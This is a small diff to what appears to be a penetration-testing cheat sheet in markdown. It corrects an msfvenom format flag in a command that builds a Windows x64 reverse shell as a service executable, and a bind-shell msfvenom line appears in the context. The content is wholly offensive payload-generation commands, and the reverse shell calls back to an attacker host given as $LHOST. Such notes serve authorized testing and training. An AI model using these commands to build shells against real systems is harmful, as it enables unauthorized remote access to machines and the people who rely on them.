@@ -20,7 +20,7 @@ msfvenom -p windows/shell_bind_tcp LHOST=$LHOST LPORT=443 EXITFUNC=thread -b "\x
 
 #### service
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f service-exe -o service.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe-service -o service.exe
 ```
 
 #### Reverse Shell
